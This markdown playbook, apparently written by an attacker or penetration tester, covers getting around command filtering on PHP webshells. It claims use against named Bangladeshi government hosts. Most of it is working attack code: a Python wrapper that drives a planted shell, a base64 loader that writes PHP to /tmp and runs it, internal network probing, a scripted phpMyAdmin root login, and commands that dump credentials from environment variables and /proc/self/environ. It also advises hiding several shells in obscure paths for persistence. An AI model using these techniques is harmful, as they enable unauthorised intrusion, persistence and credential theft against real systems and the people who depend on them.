# Webshell Command Workarounds

> Battle-tested techniques for bypassing webshell command filtering.
> Proven on judiciary.gov.bd engagement (dashboard.a2i.gov.bd, June 2026).

## Problem

PHP webshells deployed on production servers often have severe filtering:
- **Pipes** (`|`) → return 404 or empty output
- **Redirections** (`>`, `>>`, `<`) → return 404
- **Complex commands** with many special characters → return 404
- **Command length limits** — even base64-encoded PHP via `php -r` has a ~1168 char B64 limit

The shell still works for simple commands (`id`, `env`, `ls`, `uname -a`, `php -m`).

## Solution: Base64 PHP file_put_contents + include

The reliable pattern for executing complex operations through filtered shells:

```python
import base64

shell_url = "https://target.com/shell.php?c="

def sh(cmd, timeout=30):
    """Execute command via webshell"""
    r = requests.get(f"{shell_url}{cmd}", timeout=timeout, verify=False)
    return r.text.strip() if r.status_code == 200 else f"HTTP{r.status_code}"

# Write and execute complex PHP via base64
php_code = '''<?php
// Your complex multi-line PHP here
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://internal.target/");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
echo $result;
?>'''

b64 = base64.b64encode(php_code.encode()).decode()
print(f"B64 length: {len(b64)}")  # MUST stay under ~1168 chars

result = sh(f"php -r '$d=base64_decode(\"{b64}\");file_put_contents(\"/tmp/x.php\",$d);include\"/tmp/x.php\";'")
```

## Critical Limits

| Constraint | Value | Consequence |
|-----------|-------|-------------|
| Max B64 length | ~1168 chars | Scripts exceeding this fail SILENTLY (no error, no output) |
| PHP file persistence | Unreliable between invocations | `/tmp` files may not survive between separate `sh()` calls |
| Shell commands working | `id`, `env`, `ls`, `uname -a`, `php -m`, `php -r` (simple) | Use these for health checks |
| Shell commands BLOCKED | Anything with `\|`, `>`, `<`, `&`, backticks, complex `php -r` | Use base64 pattern instead |

## Pitfalls

### 1. Silent script failure (most common)
**Symptom:** Script returns only `RCE_OK` (shell marker) with no other output.
**Causes:**
- B64 string too long (>1168 chars)
- PHP syntax error (escaped quotes, missing semicolons)
- PHP runtime error (`display_errors` is off)
- Curl timeout on target server

**Debug:** Test with minimal `php -r 'echo "TEST\n";'` first. If that works, gradually add code.

### 2. Between-invocation file persistence
**Symptom:** Step 1 writes a file, Step 2 can't read it.
**Solution:** Do everything in ONE script (single `include`). Don't split across multiple `sh()` calls. If you MUST split, use PHP's `file_get_contents` inside the same `php -r` call to verify.

### 3. Escaping nightmares in shell commands
**Symptom:** PHP code with quotes gets mangled by shell.
**Working pattern:** Always base64-encode the PHP code. Never try to inline it.
**Anti-pattern:** `php -r '$code="...escaped PHP with \\\"quotes\\\"...";'`
**Correct pattern:** Base64 encode → decode in PHP → file_put_contents → include

### 4. Shell death (persistence fragility)
**Reality:** Webshells get removed or die unpredictably.
- On dashboard.a2i.gov.bd: `s.php` was dead within 24 hours, but `uploads/nothi/ekShop-*.php` survived
- **ALWAYS deploy at least 3 shells** in different paths
- **Verify all shells** on campaign resume before trusting state.json
- Use non-obvious filenames, bury in subdirectories

## Internal Pivoting Through the Shell

The shell's PHP has full curl, mysqli, mongodb, redis, amqp, sockets extensions. Use PHP curl for internal HTTP requests:

```php
// Internal network probing through PHP curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://10.11.3.254/");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$r = curl_exec($ch);
echo "HTTP:" . curl_getinfo($ch, CURLINFO_HTTP_CODE) . " LEN:" . strlen($r);
```

## PMA Login via PHP Curl (proven pattern)

```php
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cjar");
curl_setopt($ch, CURLOPT_COOKIEFILE, "/tmp/cjar");
curl_setopt($ch, CURLOPT_URL, "http://target.com/phpmyadmin/");
$p = curl_exec($ch);
preg_match('/token:"([^"]+)"/', $p, $m);
$t = $m[1];
curl_setopt($ch, CURLOPT_URL, "http://target.com/phpmyadmin/index.php?route=/");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "pma_username=root&pma_password=&server=1&token=".$t);
$r = curl_exec($ch);
if (strpos($r, "navigation") !== false) echo "LOGIN_SUCCESS";
```

## PHP getenv() for credential extraction

When `.env` is not a file (K8s injects env vars), use:
```php
php -r 'echo getenv("DB_PASSWORD");'
php -r 'echo getenv("MONGO_DB_PASSWORD");'
```

K8s pods inject credentials as environment variables — `cat /proc/self/environ` or `php -r 'foreach($_ENV as $k=>$v) echo "$k=$v\n";'` reveals them all.
